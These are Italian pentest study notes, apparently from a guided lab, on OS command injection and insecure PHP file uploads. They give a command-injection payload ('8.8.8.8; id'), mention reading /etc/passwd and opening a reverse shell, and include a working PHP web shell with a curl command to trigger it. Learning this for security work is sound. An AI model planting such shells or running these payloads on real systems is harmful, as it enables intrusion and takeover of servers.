# injection
**injection**: e' una vulnerabilita in cui non c'e' netta distinzione tra input utente e codice da eseguire, ossia l'input utente puo' inquinare il codice eseguibile.

**os injection**: a qualsiasi livello, i linguaggi di programmazione offrono delle procedure per eseguire comandi bash, o per richiamare altri eseguibili

**esempio os injection**: un sito web che permette di fornire in input un indirizzo ip di cui fare il ping.
* **vulnerabilita**: posso scrivere in input `8.8.8.8; id` per eseguire anche il comando `id`.

![[Pasted image 20260619124648.png]]

**come sfrutto una os injection**?
	* leggi `/etc/passwd`
	* apri una reverse shell

## php

### guided pentest web: upload di file.
**form per upload di file**: se la piattaforma web permette dicaricare file dentro una cartella, allora potrei caricare codice eseguibile dal server.
* `.phtml` e `.php` sono formati validi per codice `php`
* **a che serve?** se carico `.phtml`, allora apache lo esegue come codice `php`!

**accept**: attenzione, i form per l'upload di file potrebbero limitare i formati accettati, tuttavia sono raggirabili se il controllo viene effettuato solo lato client

**caricare una web shell semplice**:
contenuto di `shell.phtml`:
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
* `$_GET['cmd']`: esegue il comando specificato nel parametro `cmd` dell'URL.

**una volta caricato, posso sfruttarlo in questo modo**: `curl http://10.112.156.229/uploads/documents/cmd.phtml?cmd=id`

**cosa fare ora**? fai privilege escalation
